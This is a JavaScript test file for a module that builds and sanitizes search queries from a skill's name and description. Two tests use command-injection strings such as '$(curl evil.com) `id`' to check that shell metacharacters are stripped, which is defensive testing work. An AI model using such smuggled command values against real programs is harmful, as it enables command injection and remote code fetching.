import { test } from "node:test";
import assert from "node:assert/strict";
import { buildSearchQueries, sanitizeQuery } from "../src/dedupe.js";

test("sanitizeQuery strips shell metacharacters from any query", () => {
  assert.equal(sanitizeQuery("$(curl evil.com) `id` | ; & x"), "curl evil.com id x");
  assert.equal(sanitizeQuery("how tests-run v2.1"), "how tests-run v2.1");
  assert.equal(sanitizeQuery(""), "");
});

test("buildSearchQueries produces name + description-keyword variants", () => {
  const queries = buildSearchQueries({
    name: "how-tests-run",
    description: "Use when running integration tests against the local postgres database",
  });
  assert.equal(queries[0], "how tests run");
  assert.equal(queries.length, 2);
  assert.match(queries[1], /running integration tests/);
});

test("buildSearchQueries dedupes identical variants", () => {
  const queries = buildSearchQueries({ name: "integration-tests", description: "Use when integration tests" });
  assert.equal(queries.length, 1);
});

test("description variant strips shell-special characters", () => {
  const queries = buildSearchQueries({
    name: "x-y",
    description: "Use when $(curl evil.com) `id` | ; & runs something dangerous in repos",
  });
  // Queries are passed to execFileSync (no shell), but defense in depth: the
  // description variant must not carry shell metacharacters either.
  for (const q of queries.slice(1)) {
    assert.doesNotMatch(q, /[$`|;&(){}<>]/, `query "${q}" contains shell metacharacters`);
  }
});
